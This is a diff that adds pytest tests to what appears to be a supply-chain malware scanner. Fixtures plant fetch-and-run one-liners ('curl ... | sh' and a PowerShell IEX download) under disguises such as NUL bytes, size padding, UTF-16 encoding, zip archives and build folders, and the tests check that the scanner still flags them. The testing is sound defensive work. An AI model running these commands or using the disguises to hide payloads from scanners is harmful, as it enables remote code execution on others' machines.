@@ -326,3 +326,89 @@ def test_stealer_capabilities_seen_in_third_party_samples(tmp_path: Path) -> Non
         "dump.js": "env-dump",
         "r.rb": "env-secret-send",
     }
+
+
+def scan_findings(root: Path) -> list[dict]:
+    out = subprocess.run([sys.executable, "-I", SCANNER, str(root)], capture_output=True, text=True, check=True)
+    return json.loads(out.stdout)["findings"]
+
+
+def _disguise_crash(r: Path) -> None:
+    write(r, "package.json", "[1]")  # valid JSON, wrong shape: used to crash the whole scan
+    write(r, "run.sh", "curl http://x.invalid/a | sh\n")
+
+
+def _disguise_dist(r: Path) -> None:
+    write(r, "dist/run.sh", "curl http://x.invalid/a | sh\n")
+
+
+def _disguise_src_build(r: Path) -> None:
+    write(r, "src/build/run.sh", "curl http://x.invalid/a | sh\n")
+
+
+def _disguise_nul(r: Path) -> None:
+    (r / "run.sh").write_bytes(b"\x00curl http://x.invalid/a | sh\n")
+
+
+def _disguise_large(r: Path) -> None:
+    write(r, "run.sh", "curl http://x.invalid/a | sh\n" + "#" * 2_100_000)
+
+
+def _disguise_utf16(r: Path) -> None:
+    (r / "dl.ps1").write_bytes('IEX (New-Object Net.WebClient).DownloadString("http://x.invalid/p")'.encode("utf-16"))
+
+
+def _disguise_zip(r: Path) -> None:
+    import zipfile
+
+    with zipfile.ZipFile(r / "payload.zip", "w") as z:
+        z.writestr("run.sh", "curl http://x.invalid/a | sh\n")
+
+
+@pytest.mark.parametrize(
+    "disguise",
+    [
+        _disguise_crash,
+        _disguise_dist,
+        _disguise_src_build,
+        _disguise_nul,
+        _disguise_large,
+        _disguise_utf16,
+        _disguise_zip,
+    ],
+)
+def test_disguised_payload_never_gives_exit_0(tmp_path: Path, disguise) -> None:
+    """docs/SECURITY-IMPROVEMENTS.md items 1-3, 6: a hostile layout may lower the severity, never to a clean exit 0."""
+    disguise(tmp_path)
+    findings = scan_findings(tmp_path)
+    sev = {f["severity"] for f in findings}
+    assert sev & {"CRITICAL", "HIGH"} or {f["rule"] for f in findings} >= {"unscanned-file"}, findings
+
+
+def test_crashing_file_keeps_other_findings(tmp_path: Path) -> None:
+    _disguise_crash(tmp_path)
+    findings = scan_findings(tmp_path)
+    assert verdict(findings, [])[1] == 2
+    assert any(f["rule"] == "scanner-error" and f["file"] == "package.json" for f in findings)
+
+
+def test_unscanned_files_are_listed_and_utf16_is_decoded(tmp_path: Path) -> None:
+    _disguise_utf16(tmp_path)
+    assert "powershell-dl-exec" in {f["rule"] for f in scan_findings(tmp_path)}
+    z = tmp_path / "z"
+    z.mkdir()
+    _disguise_large(z)
+    _disguise_zip(z)
+    files = {f["file"] for f in scan_findings(z) if f["rule"] == "unscanned-file"}
+    assert files == {"run.sh", "payload.zip"}
+
+
+def test_guarddog_without_result_makes_scan_incomplete(tmp_path: Path) -> None:
+    from sandbox_scan.report import merge_findings, read_results
+
+    (tmp_path / "guarddog_npm.err").write_text("")  # driver created it, GuardDog printed nothing (e.g. timeout)
+    tgz = tmp_path / "r.tgz"
+    with tarfile.open(tgz, "w:gz") as tf:
+        tf.add(tmp_path / "guarddog_npm.err", arcname="guarddog_npm.err")
+    findings, _, notes, _ = merge_findings(read_results(tgz))
+    assert any(isinstance(n, Incomplete) and "guarddog (npm)" in n for n in notes)
